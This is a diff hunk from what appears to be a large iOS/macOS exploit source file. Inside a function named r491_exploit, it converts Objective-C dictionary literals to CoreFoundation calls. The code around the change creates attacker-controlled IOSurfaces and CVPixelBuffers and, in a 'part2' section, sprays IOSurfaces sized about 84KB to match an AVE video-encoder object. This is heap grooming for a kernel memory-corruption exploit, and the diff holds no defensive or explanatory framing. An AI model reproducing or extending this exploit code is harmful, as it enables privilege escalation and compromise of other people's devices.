@@ -24562,15 +24562,27 @@ static void r491_exploit(void) {
     {
         /* Create an IOSurface we control */
         int width = 128, height = 128;
-        NSDictionary *surfprops = @{
-            @"IOSurfaceWidth": @(width),
-            @"IOSurfaceHeight": @(height),
-            @"IOSurfaceBytesPerElement": @(4),
-            @"IOSurfaceBytesPerRow": @(width * 4),
-            @"IOSurfaceAllocSize": @(width * height * 4),
-            @"IOSurfacePixelFormat": @(0x42475241), /* BGRA */
-        };
-        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)surfprops);
+        CFMutableDictionaryRef surfprops = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        int sw = width, sh = height, sbpe = 4, sbpr = width * 4;
+        int sas = width * height * 4, spf = 0x42475241;
+        CFNumberRef swn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sw);
+        CFNumberRef shn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sh);
+        CFNumberRef sbpen = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sbpe);
+        CFNumberRef sbrn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sbpr);
+        CFNumberRef sasn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sas);
+        CFNumberRef spfn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &spf);
+        CFDictionarySetValue(surfprops, CFSTR("IOSurfaceWidth"), swn);
+        CFDictionarySetValue(surfprops, CFSTR("IOSurfaceHeight"), shn);
+        CFDictionarySetValue(surfprops, CFSTR("IOSurfaceBytesPerElement"), sbpen);
+        CFDictionarySetValue(surfprops, CFSTR("IOSurfaceBytesPerRow"), sbrn);
+        CFDictionarySetValue(surfprops, CFSTR("IOSurfaceAllocSize"), sasn);
+        CFDictionarySetValue(surfprops, CFSTR("IOSurfacePixelFormat"), spfn);
+        CFRelease(swn); CFRelease(shn); CFRelease(sbpen);
+        CFRelease(sbrn); CFRelease(sasn); CFRelease(spfn);
+        IOSurfaceRef surf = IOSurfaceCreate(surfprops);
+        CFRelease(surfprops);
         if (!surf) { rlog("  Failed to create IOSurface\n"); goto part2; }
 
         uint32_t surfid = IOSurfaceGetID(surf);
@@ -24586,11 +24598,17 @@ static void r491_exploit(void) {
 
         /* Create CVPixelBuffer wrapping our IOSurface */
         CVPixelBufferRef pb = NULL;
-        NSDictionary *pbprops = @{
-            (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
-        };
+        CFMutableDictionaryRef pbprops = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        CFDictionaryRef empty = CFDictionaryCreate(kCFAllocatorDefault,
+            NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(pbprops, kCVPixelBufferIOSurfacePropertiesKey, empty);
+        CFRelease(empty);
         CVReturn cvr = CVPixelBufferCreateWithIOSurface(
-            kCFAllocatorDefault, surf, (__bridge CFDictionaryRef)pbprops, &pb);
+            kCFAllocatorDefault, surf, pbprops, &pb);
+        CFRelease(pbprops);
         rlog("  CVPixelBuffer from IOSurface: cvr=%d pb=%p\n", cvr, pb);
 
         if (pb) {
@@ -24764,15 +24782,22 @@ part2:
         int surf_created = 0;
         for (int i = 0; i < R491_SPRAY_SURF; i++) {
             /* Target ~84KB allocation to match AVE object size */
-            NSDictionary *sp = @{
-                @"IOSurfaceWidth": @(1),
-                @"IOSurfaceHeight": @(1),
-                @"IOSurfaceBytesPerElement": @(1),
-                @"IOSurfaceBytesPerRow": @(86016),
-                @"IOSurfaceAllocSize": @(86016),
-                @"IOSurfacePixelFormat": @(0x20202038), /* L008 */
-            };
-            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            int v1 = 1, v86016 = 86016, vpf = 0x20202038;
+            CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v1);
+            CFNumberRef n86 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v86016);
+            CFNumberRef npf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), n1);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), n1);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), n1);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), n86);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), n86);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), npf);
+            CFRelease(n1); CFRelease(n86); CFRelease(npf);
+            IOSurfaceRef s = IOSurfaceCreate(sp);
+            CFRelease(sp);
             if (s) {
                 spray_surfs[i] = s;
                 surf_created++;
